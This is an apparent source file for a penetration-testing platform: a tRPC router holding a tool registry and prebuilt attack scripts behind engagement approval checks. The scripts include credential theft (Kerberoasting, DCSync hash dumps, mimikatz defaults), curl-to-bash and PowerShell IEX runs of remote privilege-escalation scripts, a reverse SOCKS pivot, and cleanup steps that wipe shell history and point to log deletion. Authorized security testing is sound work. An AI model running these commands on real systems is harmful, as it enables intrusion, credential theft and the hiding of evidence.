import { TRPCError } from "@trpc/server";
import { protectedProcedure, router } from "../_core/trpc";
import { z } from "zod";
import * as db from "../db";
import { eq, desc, sql, and } from "drizzle-orm";
import * as schema from "../../drizzle/schema";
import { assertEngagementAccess } from "../lib/engagement-access-guard";
import { TOOL_TIER_CLASSIFICATION, type ToolClassification, type ScanMode } from "../lib/scan-policy-engine";

// ── Tool Registry ──────────────────────────────────────────────────────────
// Extends TOOL_TIER_CLASSIFICATION with execution metadata

export interface ToolDefinition extends ToolClassification {
  category: "recon" | "scanning" | "enumeration" | "exploitation" | "post-exploit" | "credential" | "evasion" | "c2" | "utility";
  defaultArgs: string;
  outputFormat: "json" | "xml" | "text" | "csv" | "ndjson";
  parser: string; // parser function name for output ingestion
  requiresTarget: boolean;
  requiresScanServer: boolean;
  estimatedDuration: string; // e.g. "30s", "5m", "30m"
  safetyLevel: "passive_only" | "low_impact" | "standard" | "full_exploitation";
}

// Build the full tool registry from TOOL_TIER_CLASSIFICATION + execution metadata
const TOOL_EXECUTION_META: Record<string, Partial<ToolDefinition>> = {
  // ── Recon Tools ──
  "subfinder": { category: "recon", defaultArgs: "-d {target} -silent", outputFormat: "text", parser: "parseSubdomainList", requiresTarget: true, requiresScanServer: true, estimatedDuration: "2m", safetyLevel: "passive_only" },
  "amass": { category: "recon", defaultArgs: "enum -passive -d {target}", outputFormat: "text", parser: "parseSubdomainList", requiresTarget: true, requiresScanServer: true, estimatedDuration: "10m", safetyLevel: "passive_only" },
  "assetfinder": { category: "recon", defaultArgs: "--subs-only {target}", outputFormat: "text", parser: "parseSubdomainList", requiresTarget: true, requiresScanServer: true, estimatedDuration: "1m", safetyLevel: "passive_only" },
  "findomain": { category: "recon", defaultArgs: "-t {target} -q", outputFormat: "text", parser: "parseSubdomainList", requiresTarget: true, requiresScanServer: true, estimatedDuration: "2m", safetyLevel: "passive_only" },
  "theHarvester": { category: "recon", defaultArgs: "-d {target} -b all", outputFormat: "json", parser: "parseTheHarvester", requiresTarget: true, requiresScanServer: true, estimatedDuration: "5m", safetyLevel: "passive_only" },
  "gau": { category: "recon", defaultArgs: "{target}", outputFormat: "text", parser: "parseUrlList", requiresTarget: true, requiresScanServer: true, estimatedDuration: "3m", safetyLevel: "passive_only" },
  "waybackurls": { category: "recon", defaultArgs: "{target}", outputFormat: "text", parser: "parseUrlList", requiresTarget: true, requiresScanServer: true, estimatedDuration: "2m", safetyLevel: "passive_only" },
  "crt.sh": { category: "recon", defaultArgs: "%.{target}", outputFormat: "json", parser: "parseCrtSh", requiresTarget: true, requiresScanServer: false, estimatedDuration: "30s", safetyLevel: "passive_only" },

  // ── DNS & Enumeration ──
  "dnsx": { category: "enumeration", defaultArgs: "-l {input} -a -aaaa -cname -mx -ns -resp", outputFormat: "json", parser: "parseDnsx", requiresTarget: false, requiresScanServer: true, estimatedDuration: "3m", safetyLevel: "low_impact" },
  "httpx": { category: "enumeration", defaultArgs: "-l {input} -status-code -title -tech-detect -json", outputFormat: "ndjson", parser: "parseHttpx", requiresTarget: false, requiresScanServer: true, estimatedDuration: "5m", safetyLevel: "low_impact" },
  "naabu": { category: "scanning", defaultArgs: "-host {target} -top-ports 1000 -json", outputFormat: "ndjson", parser: "parseNaabu", requiresTarget: true, requiresScanServer: true, estimatedDuration: "5m", safetyLevel: "low_impact" },

  // ── Vulnerability Scanning ──
  "nmap": { category: "scanning", defaultArgs: "-sV -sC -oX - {target}", outputFormat: "xml", parser: "parseNmapXml", requiresTarget: true, requiresScanServer: true, estimatedDuration: "15m", safetyLevel: "standard" },
  "nuclei": { category: "scanning", defaultArgs: "-u {target} -json -severity critical,high,medium", outputFormat: "ndjson", parser: "parseNuclei", requiresTarget: true, requiresScanServer: true, estimatedDuration: "20m", safetyLevel: "standard" },
  "nikto": { category: "scanning", defaultArgs: "-h {target} -Format json", outputFormat: "json", parser: "parseNikto", requiresTarget: true, requiresScanServer: true, estimatedDuration: "15m", safetyLevel: "standard" },
  "gobuster": { category: "enumeration", defaultArgs: "dir -u {target} -w /usr/share/wordlists/dirb/common.txt -o -", outputFormat: "text", parser: "parseGobuster", requiresTarget: true, requiresScanServer: true, estimatedDuration: "10m", safetyLevel: "standard" },
  "ffuf": { category: "enumeration", defaultArgs: "-u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -o - -of json", outputFormat: "json", parser: "parseFfuf", requiresTarget: true, requiresScanServer: true, estimatedDuration: "10m", safetyLevel: "standard" },
  "katana": { category: "enumeration", defaultArgs: "-u {target} -json -depth 3", outputFormat: "ndjson", parser: "parseKatana", requiresTarget: true, requiresScanServer: true, estimatedDuration: "10m", safetyLevel: "standard" },
  "gowitness": { category: "enumeration", defaultArgs: "single {target}", outputFormat: "json", parser: "parseGowitness", requiresTarget: true, requiresScanServer: true, estimatedDuration: "30s", safetyLevel: "low_impact" },

  // ── Web Application Testing ──
  "sqlmap": { category: "exploitation", defaultArgs: "-u {target} --batch --level=3 --risk=2 --output-dir=/tmp/sqlmap", outputFormat: "text", parser: "parseSqlmap", requiresTarget: true, requiresScanServer: true, estimatedDuration: "30m", safetyLevel: "full_exploitation" },
  "hydra": { category: "credential", defaultArgs: "-L users.txt -P passwords.txt {target} ssh", outputFormat: "text", parser: "parseHydra", requiresTarget: true, requiresScanServer: true, estimatedDuration: "30m", safetyLevel: "full_exploitation" },
  "wfuzz": { category: "enumeration", defaultArgs: "-u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt", outputFormat: "text", parser: "parseWfuzz", requiresTarget: true, requiresScanServer: true, estimatedDuration: "10m", safetyLevel: "standard" },

  // ── Exploitation ──
  "metasploit": { category: "exploitation", defaultArgs: "use {module}; set RHOSTS {target}; run", outputFormat: "text", parser: "parseMsfConsole", requiresTarget: true, requiresScanServer: true, estimatedDuration: "10m", safetyLevel: "full_exploitation" },
  "searchsploit": { category: "exploitation", defaultArgs: "{query} --json", outputFormat: "json", parser: "parseSearchsploit", requiresTarget: false, requiresScanServer: true, estimatedDuration: "10s", safetyLevel: "passive_only" },

  // ── Post-Exploitation ──
  "linpeas": { category: "post-exploit", defaultArgs: "-a", outputFormat: "text", parser: "parseLinpeas", requiresTarget: false, requiresScanServer: false, estimatedDuration: "5m", safetyLevel: "full_exploitation" },
  "winpeas": { category: "post-exploit", defaultArgs: "", outputFormat: "text", parser: "parseWinpeas", requiresTarget: false, requiresScanServer: false, estimatedDuration: "5m", safetyLevel: "full_exploitation" },
  "bloodhound-python": { category: "post-exploit", defaultArgs: "-d {target} -u {user} -p {pass} -c all", outputFormat: "json", parser: "parseBloodhound", requiresTarget: true, requiresScanServer: true, estimatedDuration: "10m", safetyLevel: "full_exploitation" },
  "crackmapexec": { category: "credential", defaultArgs: "smb {target} -u {user} -p {pass}", outputFormat: "text", parser: "parseCme", requiresTarget: true, requiresScanServer: true, estimatedDuration: "5m", safetyLevel: "full_exploitation" },
  "impacket-secretsdump": { category: "credential", defaultArgs: "{user}:{pass}@{target}", outputFormat: "text", parser: "parseSecretsdump", requiresTarget: true, requiresScanServer: true, estimatedDuration: "5m", safetyLevel: "full_exploitation" },
  "responder": { category: "credential", defaultArgs: "-I eth0 -A", outputFormat: "text", parser: "parseResponder", requiresTarget: false, requiresScanServer: true, estimatedDuration: "30m", safetyLevel: "full_exploitation" },
  "mimikatz": { category: "credential", defaultArgs: "sekurlsa::logonpasswords", outputFormat: "text", parser: "parseMimikatz", requiresTarget: false, requiresScanServer: false, estimatedDuration: "1m", safetyLevel: "full_exploitation" },

  // ── Evasion & C2 ──
  "chisel": { category: "c2", defaultArgs: "client {target}:8080 R:socks", outputFormat: "text", parser: "parseTunnelOutput", requiresTarget: true, requiresScanServer: true, estimatedDuration: "1m", safetyLevel: "full_exploitation" },
  "ligolo-ng": { category: "c2", defaultArgs: "", outputFormat: "text", parser: "parseTunnelOutput", requiresTarget: true, requiresScanServer: true, estimatedDuration: "1m", safetyLevel: "full_exploitation" },
};

// Pre-built scripts matched to common engagement scenarios
export interface PrebuiltScript {
  id: string;
  name: string;
  description: string;
  category: "recon" | "scanning" | "exploitation" | "post-exploit" | "credential" | "evasion" | "pivot" | "cleanup";
  targetOs: "windows" | "linux" | "any";
  mitreTechniques: string[];
  safetyLevel: "passive_only" | "low_impact" | "standard" | "full_exploitation";
  requiresApproval: boolean;
  script: string;
  tags: string[];
}

export const PREBUILT_SCRIPTS: PrebuiltScript[] = [
  // ── Recon Scripts ──
  {
    id: "recon-full-passive",
    name: "Full Passive Recon",
    description: "Run subfinder + amass + crt.sh + gau + waybackurls against a domain, deduplicate results",
    category: "recon",
    targetOs: "any",
    mitreTechniques: ["T1596", "T1593"],
    safetyLevel: "passive_only",
    requiresApproval: false,
    script: `#!/bin/bash
# Full Passive Recon Pipeline
TARGET="{target}"
OUTDIR="/tmp/recon-$TARGET-$(date +%s)"
mkdir -p "$OUTDIR"

echo "[*] Running subfinder..."
subfinder -d "$TARGET" -silent > "$OUTDIR/subfinder.txt" 2>/dev/null

echo "[*] Running amass passive..."
amass enum -passive -d "$TARGET" -o "$OUTDIR/amass.txt" 2>/dev/null

echo "[*] Querying crt.sh..."
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' 2>/dev/null | sort -u > "$OUTDIR/crtsh.txt"

echo "[*] Running gau..."
echo "$TARGET" | gau --threads 5 > "$OUTDIR/gau.txt" 2>/dev/null

echo "[*] Running waybackurls..."
echo "$TARGET" | waybackurls > "$OUTDIR/wayback.txt" 2>/dev/null

echo "[*] Deduplicating subdomains..."
cat "$OUTDIR"/subfinder.txt "$OUTDIR"/amass.txt "$OUTDIR"/crtsh.txt | sort -u > "$OUTDIR/all-subdomains.txt"
SUBDOMAIN_COUNT=$(wc -l < "$OUTDIR/all-subdomains.txt")

echo "[*] Deduplicating URLs..."
cat "$OUTDIR"/gau.txt "$OUTDIR"/wayback.txt | sort -u > "$OUTDIR/all-urls.txt"
URL_COUNT=$(wc -l < "$OUTDIR/all-urls.txt")

echo ""
echo "=== RESULTS ==="
echo "Unique subdomains: $SUBDOMAIN_COUNT"
echo "Unique URLs: $URL_COUNT"
echo "Output directory: $OUTDIR"
cat "$OUTDIR/all-subdomains.txt"`,
    tags: ["subdomain", "url", "passive", "osint"],
  },
  {
    id: "recon-http-probe",
    name: "HTTP Probe & Tech Detect",
    description: "Probe discovered subdomains with httpx for live hosts, status codes, titles, and technology detection",
    category: "recon",
    targetOs: "any",
    mitreTechniques: ["T1595.002"],
    safetyLevel: "low_impact",
    requiresApproval: false,
    script: `#!/bin/bash
# HTTP Probe with Technology Detection
INPUT="{input_file}"
OUTDIR="/tmp/httpx-$(date +%s)"
mkdir -p "$OUTDIR"

echo "[*] Probing live hosts with httpx..."
httpx -l "$INPUT" -status-code -title -tech-detect -content-length -web-server -json -o "$OUTDIR/httpx.json" 2>/dev/null

echo "[*] Extracting live hosts..."
cat "$OUTDIR/httpx.json" | jq -r 'select(.status_code >= 200 and .status_code < 400) | .url' > "$OUTDIR/live-hosts.txt"
LIVE_COUNT=$(wc -l < "$OUTDIR/live-hosts.txt")

echo ""
echo "=== RESULTS ==="
echo "Live hosts: $LIVE_COUNT"
echo "Full results: $OUTDIR/httpx.json"
cat "$OUTDIR/httpx.json" | jq -c '{url: .url, status: .status_code, title: .title, tech: .technologies}'`,
    tags: ["http", "probe", "technology", "live-hosts"],
  },
  // ── Scanning Scripts ──
  {
    id: "scan-full-port",
    name: "Full Port Scan + Service Detection",
    description: "Run naabu for fast port discovery, then nmap for service/version detection on open ports",
    category: "scanning",
    targetOs: "any",
    mitreTechniques: ["T1046"],
    safetyLevel: "standard",
    requiresApproval: true,
    script: `#!/bin/bash
# Full Port Scan Pipeline
TARGET="{target}"
OUTDIR="/tmp/portscan-$TARGET-$(date +%s)"
mkdir -p "$OUTDIR"

echo "[*] Fast port discovery with naabu..."
naabu -host "$TARGET" -top-ports 1000 -json -o "$OUTDIR/naabu.json" 2>/dev/null
PORTS=$(cat "$OUTDIR/naabu.json" | jq -r '.port' | sort -un | tr '\\n' ',' | sed 's/,$//')

if [ -z "$PORTS" ]; then
  echo "[!] No open ports found"
  exit 0
fi

echo "[*] Found ports: $PORTS"
echo "[*] Running nmap service detection..."
nmap -sV -sC -p "$PORTS" -oX "$OUTDIR/nmap.xml" -oN "$OUTDIR/nmap.txt" "$TARGET" 2>/dev/null

echo ""
echo "=== RESULTS ==="
echo "Open ports: $PORTS"
cat "$OUTDIR/nmap.txt"`,
    tags: ["port-scan", "service-detection", "nmap", "naabu"],
  },
  {
    id: "scan-vuln-nuclei",
    name: "Nuclei Vulnerability Scan",
    description: "Run nuclei with critical/high/medium severity templates against a target",
    category: "scanning",
    targetOs: "any",
    mitreTechniques: ["T1595.002"],
    safetyLevel: "standard",
    requiresApproval: true,
    script: `#!/bin/bash
# Nuclei Vulnerability Scan
TARGET="{target}"
OUTDIR="/tmp/nuclei-$(date +%s)"
mkdir -p "$OUTDIR"

echo "[*] Updating nuclei templates..."
nuclei -update-templates 2>/dev/null

echo "[*] Running nuclei scan (critical + high + medium)..."
nuclei -u "$TARGET" -severity critical,high,medium -json -o "$OUTDIR/nuclei.json" 2>/dev/null

CRIT=$(cat "$OUTDIR/nuclei.json" | jq -r 'select(.info.severity == "critical")' | wc -l)
HIGH=$(cat "$OUTDIR/nuclei.json" | jq -r 'select(.info.severity == "high")' | wc -l)
MED=$(cat "$OUTDIR/nuclei.json" | jq -r 'select(.info.severity == "medium")' | wc -l)

echo ""
echo "=== RESULTS ==="
echo "Critical: $CRIT | High: $HIGH | Medium: $MED"
cat "$OUTDIR/nuclei.json" | jq -c '{template: .template, severity: .info.severity, name: .info.name, matched: .matched_at}'`,
    tags: ["vulnerability", "nuclei", "cve"],
  },
  // ── Exploitation Scripts ──
  {
    id: "exploit-searchsploit",
    name: "SearchSploit Lookup",
    description: "Search ExploitDB for known exploits matching a service/version string",
    category: "exploitation",
    targetOs: "any",
    mitreTechniques: ["T1588.005"],
    safetyLevel: "passive_only",
    requiresApproval: false,
    script: `#!/bin/bash
# SearchSploit Exploit Lookup
QUERY="{query}"
echo "[*] Searching ExploitDB for: $QUERY"
searchsploit "$QUERY" --json 2>/dev/null | jq '.'

echo ""
echo "[*] To mirror an exploit: searchsploit -m <exploit_id>"`,
    tags: ["exploit", "exploitdb", "search"],
  },
  // ── Credential Scripts ──
  {
    id: "cred-kerberoast",
    name: "Kerberoasting Attack",
    description: "Extract service ticket hashes from Active Directory for offline cracking",
    category: "credential",
    targetOs: "windows",
    mitreTechniques: ["T1558.003"],
    safetyLevel: "full_exploitation",
    requiresApproval: true,
    script: `#!/bin/bash
# Kerberoasting with impacket
DOMAIN="{domain}"
USER="{user}"
PASS="{pass}"
DC="{dc_ip}"
OUTDIR="/tmp/kerberoast-$(date +%s)"
mkdir -p "$OUTDIR"

echo "[*] Running GetUserSPNs.py for Kerberoasting..."
python3 /opt/impacket/examples/GetUserSPNs.py "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request -outputfile "$OUTDIR/hashes.txt" 2>/dev/null

HASH_COUNT=$(wc -l < "$OUTDIR/hashes.txt" 2>/dev/null || echo 0)
echo ""
echo "=== RESULTS ==="
echo "Service ticket hashes extracted: $HASH_COUNT"
echo "Hash file: $OUTDIR/hashes.txt"
echo ""
echo "[*] To crack: hashcat -m 13100 $OUTDIR/hashes.txt /path/to/wordlist"`,
    tags: ["kerberoast", "active-directory", "credential", "hash"],
  },
  {
    id: "cred-asreproast",
    name: "AS-REP Roasting",
    description: "Find accounts with Kerberos pre-auth disabled and extract AS-REP hashes",
    category: "credential",
    targetOs: "windows",
    mitreTechniques: ["T1558.004"],
    safetyLevel: "full_exploitation",
    requiresApproval: true,
    script: `#!/bin/bash
# AS-REP Roasting with impacket
DOMAIN="{domain}"
USER="{user}"
PASS="{pass}"
DC="{dc_ip}"
OUTDIR="/tmp/asreproast-$(date +%s)"
mkdir -p "$OUTDIR"

echo "[*] Running GetNPUsers.py for AS-REP Roasting..."
python3 /opt/impacket/examples/GetNPUsers.py "$DOMAIN/$USER:$PASS" -dc-ip "$DC" -request -outputfile "$OUTDIR/asrep-hashes.txt" 2>/dev/null

HASH_COUNT=$(wc -l < "$OUTDIR/asrep-hashes.txt" 2>/dev/null || echo 0)
echo ""
echo "=== RESULTS ==="
echo "AS-REP hashes extracted: $HASH_COUNT"
echo "Hash file: $OUTDIR/asrep-hashes.txt"
echo ""
echo "[*] To crack: hashcat -m 18200 $OUTDIR/asrep-hashes.txt /path/to/wordlist"`,
    tags: ["asreproast", "active-directory", "credential", "hash"],
  },
  {
    id: "cred-secretsdump",
    name: "Secrets Dump (Domain Admin)",
    description: "Dump all domain hashes via DCSync using impacket-secretsdump",
    category: "credential",
    targetOs: "windows",
    mitreTechniques: ["T1003.006"],
    safetyLevel: "full_exploitation",
    requiresApproval: true,
    script: `#!/bin/bash
# DCSync with impacket-secretsdump
DOMAIN="{domain}"
USER="{user}"
PASS="{pass}"
DC="{dc_ip}"
OUTDIR="/tmp/secretsdump-$(date +%s)"
mkdir -p "$OUTDIR"

echo "[*] Running secretsdump.py (DCSync)..."
python3 /opt/impacket/examples/secretsdump.py "$DOMAIN/$USER:$PASS@$DC" -outputfile "$OUTDIR/dump" 2>/dev/null

echo ""
echo "=== RESULTS ==="
ls -la "$OUTDIR/"
echo ""
echo "[!] OPSEC WARNING: DCSync generates Event ID 4662 on the DC"`,
    tags: ["dcsync", "secretsdump", "domain-admin", "ntds"],
  },
  // ── Post-Exploit Scripts ──
  {
    id: "postexploit-winprivesc-check",
    name: "Windows Privilege Escalation Check",
    description: "Run WinPEAS to enumerate privilege escalation vectors on a Windows host",
    category: "post-exploit",
    targetOs: "windows",
    mitreTechniques: ["T1082", "T1083"],
    safetyLevel: "full_exploitation",
    requiresApproval: true,
    script: `powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"`,
    tags: ["privesc", "windows", "winpeas", "enumeration"],
  },
  {
    id: "postexploit-linprivesc-check",
    name: "Linux Privilege Escalation Check",
    description: "Run LinPEAS to enumerate privilege escalation vectors on a Linux host",
    category: "post-exploit",
    targetOs: "linux",
    mitreTechniques: ["T1082", "T1083"],
    safetyLevel: "full_exploitation",
    requiresApproval: true,
    script: `#!/bin/bash
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash`,
    tags: ["privesc", "linux", "linpeas", "enumeration"],
  },
  {
    id: "postexploit-bloodhound",
    name: "BloodHound AD Collection",
    description: "Collect Active Directory data for BloodHound graph analysis",
    category: "post-exploit",
    targetOs: "windows",
    mitreTechniques: ["T1087.002", "T1069.002"],
    safetyLevel: "full_exploitation",
    requiresApproval: true,
    script: `#!/bin/bash
# BloodHound Collection
DOMAIN="{domain}"
USER="{user}"
PASS="{pass}"
DC="{dc_ip}"
OUTDIR="/tmp/bloodhound-$(date +%s)"
mkdir -p "$OUTDIR"

echo "[*] Running bloodhound-python collector..."
bloodhound-python -d "$DOMAIN" -u "$USER" -p "$PASS" -ns "$DC" -c all --zip -o "$OUTDIR" 2>/dev/null

echo ""
echo "=== RESULTS ==="
ls -la "$OUTDIR/"
echo ""
echo "[*] Upload the .zip file to BloodHound for graph analysis"`,
    tags: ["bloodhound", "active-directory", "graph", "collection"],
  },
  // ── Pivot Scripts ──
  {
    id: "pivot-chisel-socks",
    name: "Chisel SOCKS Proxy",
    description: "Establish a SOCKS5 proxy through a compromised host using Chisel",
    category: "pivot",
    targetOs: "any",
    mitreTechniques: ["T1572"],
    safetyLevel: "full_exploitation",
    requiresApproval: true,
    script: `#!/bin/bash
# Chisel SOCKS Proxy Setup
# On attack server (listener):
# chisel server --reverse --port 8080

# On compromised host (client):
ATTACK_SERVER="{attack_server}"
echo "[*] Connecting to Chisel server at $ATTACK_SERVER:8080..."
./chisel client "$ATTACK_SERVER:8080" R:1080:socks

echo "[*] SOCKS5 proxy available at localhost:1080"
echo "[*] Use with proxychains: proxychains nmap -sT -Pn {internal_target}"`,
    tags: ["pivot", "socks", "tunnel", "chisel"],
  },
  // ── Cleanup Scripts ──
  {
    id: "cleanup-linux",
    name: "Linux Artifact Cleanup",
    description: "Remove common artifacts left by offensive tools on a Linux host",
    category: "cleanup",
    targetOs: "linux",
    mitreTechniques: ["T1070.004"],
    safetyLevel: "full_exploitation",
    requiresApproval: true,
    script: `#!/bin/bash
# Linux Cleanup Script
echo "[*] Cleaning up offensive artifacts..."

# Remove tool output directories
rm -rf /tmp/recon-* /tmp/portscan-* /tmp/nuclei-* /tmp/httpx-* /tmp/bloodhound-* /tmp/secretsdump-* /tmp/kerberoast-* /tmp/asreproast-* 2>/dev/null

# Clear bash history
history -c
cat /dev/null > ~/.bash_history

# Remove downloaded tools
rm -f /tmp/linpeas.sh /tmp/chisel /tmp/ligolo-* 2>/dev/null

echo "[*] Cleanup complete"
echo "[!] Remember to also clean: /var/log/auth.log, /var/log/syslog, ~/.ssh/known_hosts"`,
    tags: ["cleanup", "artifacts", "opsec"],
  },
  {
    id: "cleanup-windows",
    name: "Windows Artifact Cleanup",
    description: "Remove common artifacts left by offensive tools on a Windows host",
    category: "cleanup",
    targetOs: "windows",
    mitreTechniques: ["T1070.004"],
    safetyLevel: "full_exploitation",
    requiresApproval: true,
    script: `powershell.exe -ep bypass -c "
# Windows Cleanup Script
Write-Host '[*] Cleaning up offensive artifacts...'

# Remove tool output directories
Remove-Item -Recurse -Force C:\\Temp\\recon-*, C:\\Temp\\scan-* -ErrorAction SilentlyContinue

# Clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Clear recent documents
Remove-Item $env:APPDATA\\Microsoft\\Windows\\Recent\\* -ErrorAction SilentlyContinue

Write-Host '[*] Cleanup complete'
Write-Host '[!] Remember to also clear: Event Logs (if authorized), Prefetch, NTUSER.DAT MRU keys'
"`,
    tags: ["cleanup", "artifacts", "opsec", "windows"],
  },
];

// Build full tool registry
function buildToolRegistry(): ToolDefinition[] {
  const registry: ToolDefinition[] = [];
  for (const tool of TOOL_TIER_CLASSIFICATION) {
    const meta = TOOL_EXECUTION_META[tool.name];
    if (meta) {
      registry.push({
        ...tool,
        category: meta.category || "utility",
        defaultArgs: meta.defaultArgs || "",
        outputFormat: meta.outputFormat || "text",
        parser: meta.parser || "parseGenericText",
        requiresTarget: meta.requiresTarget ?? true,
        requiresScanServer: meta.requiresScanServer ?? true,
        estimatedDuration: meta.estimatedDuration || "5m",
        safetyLevel: meta.safetyLevel || "standard",
      });
    }
  }
  return registry;
}

const TOOL_REGISTRY = buildToolRegistry();

// ── Output Ingestion Pipeline ──────────────────────────────────────────────

interface IngestedFinding {
  type: "subdomain" | "url" | "port" | "service" | "vulnerability" | "credential" | "technology" | "misconfiguration";
  value: string;
  severity?: "critical" | "high" | "medium" | "low" | "info";
  details: Record<string, unknown>;
  source: string;
  mitreTechnique?: string;
}

function parseGenericText(output: string, toolName: string): IngestedFinding[] {
  const findings: IngestedFinding[] = [];
  const lines = output.split("\n").filter(l => l.trim());
  for (const line of lines) {
    // Try to detect IPs, domains, URLs
    const ipMatch = line.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
    const urlMatch = line.match(/(https?:\/\/[^\s]+)/);
    const domainMatch = line.match(/([a-zA-Z0-9][-a-zA-Z0-9]*\.[a-zA-Z]{2,})/);

    if (urlMatch) {
      findings.push({ type: "url", value: urlMatch[1], details: { raw: line }, source: toolName });
    } else if (ipMatch) {
      findings.push({ type: "service", value: ipMatch[1], details: { raw: line }, source: toolName });
    } else if (domainMatch) {
      findings.push({ type: "subdomain", value: domainMatch[1], details: { raw: line }, source: toolName });
    }
  }
  return findings;
}

function parseSubdomainList(output: string, toolName: string): IngestedFinding[] {
  return output.split("\n").filter(l => l.trim()).map(line => ({
    type: "subdomain" as const,
    value: line.trim(),
    details: {},
    source: toolName,
  }));
}

function parseNucleiJson(output: string): IngestedFinding[] {
  const findings: IngestedFinding[] = [];
  for (const line of output.split("\n").filter(l => l.trim())) {
    try {
      const obj = JSON.parse(line);
      findings.push({
        type: "vulnerability",
        value: obj.info?.name || obj.template || "Unknown",
        severity: obj.info?.severity || "info",
        details: {
          template: obj.template,
          matched_at: obj.matched_at || obj["matched-at"],
          description: obj.info?.description,
          reference: obj.info?.reference,
          tags: obj.info?.tags,
          cve: obj.info?.classification?.["cve-id"],
        },
        source: "nuclei",
        mitreTechnique: obj.info?.classification?.["mitre-attack"]?.[0],
      });
    } catch { /* skip non-JSON lines */ }
  }
  return findings;
}

function parseNmapOutput(output: string): IngestedFinding[] {
  const findings: IngestedFinding[] = [];
  // Parse nmap text output for open ports and services
  const portRegex = /(\d+)\/(tcp|udp)\s+open\s+(\S+)\s*(.*)/g;
  let match;
  while ((match = portRegex.exec(output)) !== null) {
    findings.push({
      type: "port",
      value: `${match[1]}/${match[2]}`,
      details: { port: parseInt(match[1]), protocol: match[2], service: match[3], version: match[4]?.trim() },
      source: "nmap",
    });
    if (match[4]?.trim()) {
      findings.push({
        type: "service",
        value: match[3],
        details: { port: parseInt(match[1]), version: match[4].trim() },
        source: "nmap",
      });
    }
  }
  return findings;
}

function parseToolOutput(output: string, toolName: string, format: string): IngestedFinding[] {
  switch (toolName) {
    case "nuclei": return parseNucleiJson(output);
    case "nmap": return parseNmapOutput(output);
    case "subfinder":
    case "amass":
    case "assetfinder":
    case "findomain":
      return parseSubdomainList(output, toolName);
    default:
      return parseGenericText(output, toolName);
  }
}

// ── tRPC Router ────────────────────────────────────────────────────────────

export const toolRunnerRouter = router({
  /** Get the full tool registry with execution metadata */
  getToolRegistry: protectedProcedure
    .input(z.object({
      engagementId: z.number(),
      category: z.string().optional(),
      tier: z.string().optional(),
      search: z.string().optional(),
    }))
    .query(async ({ input, ctx }) => {
      const dbConn = await db.getDb();
      if (dbConn) await assertEngagementAccess(dbConn, input.engagementId, ctx.user);

      let tools = [...TOOL_REGISTRY];

      // Filter by category
      if (input.category) {
        tools = tools.filter(t => t.category === input.category);
      }
      // Filter by tier
      if (input.tier) {
        tools = tools.filter(t => t.tier === input.tier);
      }
      // Search by name or description
      if (input.search) {
        const q = input.search.toLowerCase();
        tools = tools.filter(t =>
          t.name.toLowerCase().includes(q) ||
          t.description.toLowerCase().includes(q)
        );
      }

      // Get engagement safety level to mark which tools are available
      const engagement = await db.getEngagementById(input.engagementId);
      const safetyLevel = (engagement as any)?.safetyLevel || "standard";

      const SAFETY_ORDER = ["passive_only", "low_impact", "standard", "full_exploitation"];
      const currentLevel = SAFETY_ORDER.indexOf(safetyLevel);

      return {
        tools: tools.map(t => ({
          ...t,
          available: SAFETY_ORDER.indexOf(t.safetyLevel) <= currentLevel,
          blockedReason: SAFETY_ORDER.indexOf(t.safetyLevel) > currentLevel
            ? `Requires safety level "${t.safetyLevel}" (current: "${safetyLevel}")`
            : undefined,
        })),
        totalCount: TOOL_REGISTRY.length,
        categories: [...new Set(TOOL_REGISTRY.map(t => t.category))],
        tiers: [...new Set(TOOL_REGISTRY.map(t => t.tier))],
      };
    }),

  /** Get pre-built scripts, optionally filtered by target profile */
  getPrebuiltScripts: protectedProcedure
    .input(z.object({
      engagementId: z.number(),
      category: z.string().optional(),
      targetOs: z.string().optional(),
      search: z.string().optional(),
    }))
    .query(async ({ input, ctx }) => {
      const dbConn = await db.getDb();
      if (dbConn) await assertEngagementAccess(dbConn, input.engagementId, ctx.user);

      let scripts = [...PREBUILT_SCRIPTS];

      if (input.category) {
        scripts = scripts.filter(s => s.category === input.category);
      }
      if (input.targetOs && input.targetOs !== "any") {
        scripts = scripts.filter(s => s.targetOs === input.targetOs || s.targetOs === "any");
      }
      if (input.search) {
        const q = input.search.toLowerCase();
        scripts = scripts.filter(s =>
          s.name.toLowerCase().includes(q) ||
          s.description.toLowerCase().includes(q) ||
          s.tags.some(t => t.includes(q))
        );
      }

      return {
        scripts,
        categories: [...new Set(PREBUILT_SCRIPTS.map(s => s.category))],
      };
    }),

  /** Get matched exploits from the knowledge store for the current engagement's findings */
  getMatchedExploits: protectedProcedure
    .input(z.object({
      engagementId: z.number(),
      query: z.string().optional(),
      limit: z.number().optional().default(20),
    }))
    .query(async ({ input, ctx }) => {
      const dbConn = await db.getDb();
      if (dbConn) await assertEngagementAccess(dbConn, input.engagementId, ctx.user);

      try {
        const { searchExploits, getStoreStats } = await import("../lib/exploit-knowledge-store");
        const stats = getStoreStats();

        if (input.query) {
          const results = await searchExploits(input.query, { limit: input.limit });
          return {
            results: results.map(r => ({
              id: r.document.id,
              title: r.document.title,
              description: r.document.description,
              cveIds: r.document.cveIds,
              platform: r.document.platform,
              service: r.document.service,
              exploitType: r.document.exploitType,
              language: r.document.language,
              code: r.document.code?.substring(0, 500), // Truncate for listing
              sourceUrl: r.document.sourceUrl,
              reliabilityScore: r.document.reliabilityScore,
              score: r.score,
              matchReason: r.matchReason,
            })),
            storeStats: stats,
          };
        }

        return { results: [], storeStats: stats };
      } catch {
        return { results: [], storeStats: { totalDocuments: 0, indexedAt: null } };
      }
    }),

  /** Record a manual tool execution and ingest its output */
  recordToolExecution: protectedProcedure
    .input(z.object({
      engagementId: z.number(),
      toolName: z.string(),
      command: z.string(),
      target: z.string().optional(),
      output: z.string(),
      exitCode: z.number().optional(),
      durationMs: z.number().optional(),
      notes: z.string().optional(),
    }))
    .mutation(async ({ input, ctx }) => {
      const dbConn = await db.getDb();
      if (!dbConn) throw new TRPCError({ code: "INTERNAL_SERVER_ERROR", message: "Database unavailable" });
      await assertEngagementAccess(dbConn, input.engagementId, ctx.user);

